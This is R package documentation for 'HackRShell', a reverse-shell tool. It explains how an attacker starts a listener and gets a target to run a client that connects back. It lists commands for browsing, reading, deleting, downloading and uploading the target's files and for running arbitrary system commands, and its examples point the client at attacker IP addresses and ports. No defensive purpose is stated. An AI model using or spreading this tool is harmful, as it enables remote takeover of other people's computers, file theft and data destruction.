\name{HackRshell}
\alias{HackRshell}
\alias{hackrshell}
\alias{hackRshell}
\alias{HackRShell}
\alias{hRs.client}
\alias{hRs.server}

\title{
HackRShell - the R Reverse Shell
}

\description{
This program spawns a reverse shell on a target's computer. The attacker first runs the hRs.server() function on their machine, which will start the server listening for connections. Once a target runs the hRs.client() function with the corrrect address and port numbers, the target's R session will hang and the attacker should see a connection to their computer with the prompt "Shell>". From there, the attacker can enter commands and they will execute on the target's R session. See the details section for a list of valid commands. Note that commands are case-sensitive.

To end the session, the attacker sends the "exit"" command
}
\usage{
hRs.server(host, port, secondaryPort)

hRs.client(host, port, secondaryPort)
}
\arguments{
  \item{host}{
    The IPv4 address of the remote server, as a string. Defaults to "localhost".
  }
  \item{port}{
    The TCP port number of the listening process on the remote server, as an integer. Defaults to 4471 as an arbitrary choice.
  }
  \item{secondaryPort}{
  The TCP port number that the server will listen on to download or upload files. See the download and upload commands below. Do not make this the same value as the port argument. Defaults to 5472 as an arbitrary choice.
  }
}
\details{

List of Commands:

  pwd: print the current working directory

  (ls, dir): list the contents of the current directory. Note that the program currently does not distinguish clearly between directories and files, though the presence or absence of file extensions has thus far been a good way to tell.

  cd [directory name]: change the current working directory to [directory name]. If successful, the output to the terminal will be the directory that you were previously in.

  (rm, del) [filename]: delete the file [filename] if it is currently in the working directory. This call cannot delete directories, not even empty directories. If you wish to delete a directory, see the sys command below.

  (cat, type) [filename]: view the contents of [filename] as text if it is in the working directory. Will not work on files that contain non-text characters. If you wish to view the contents of these files in the terminal, see the sys command below.

  download [filename]: opens a new socket connection with server port number secondaryPort and sends the file [filename] from the client to the server. This function can only download files, not directories.

  upload[filename]: opens a new socket connection with server port number secondaryPort and sends the file [filename] from the server to the client. This function can only upload files, not directories.

  exit: end the shell session and close the socket connection.

  sys [command] [args]: Passes [command] with [args] to the target's system as a system call. For example, on Windows the "systeminfo" command is run with "sys systeminfo". See the R documentation for system() and system2() for how Windows and Unix-like OSes differ in how this command is executed.

  All other strings will result in a "Command '_____' not recognized" response.

}
\value{
These functions do not return any value.
}
\references{
None
}
\author{
Ian Roberts
}
\note{

  In order to keep the transmissions to a single line for the readLines() function, newline characters sent from the client are encoded as the string "\%&\%" before being sent to the server for decoding. While it's not likely to come up, if a command output contains that string, it will get replaced with a newline. (Downloading and uploading files are not affected by this, as those functions use a separate socket and separate read/write functions.)


  Also, the command socket has a timeout of 24 hours. (Up from the R default of 1 minute.) So do not leave a reverse shell session idle for over 24 hours, or you will silently lose the connection.

}

\examples{

hRs.server()

hRs.client()

hRs.server("192.168.0.1", 3343, 4454)

hRs.client("192.168.0.1", 3343, 4454)

hRs.server("127.0.0.1")

hRs.client("127.0.0.1")
}
\keyword{ IO }

\keyword{ file }

\keyword{ connection }

\keyword{ misc }

\concept{ socket }

\concept{ shell }
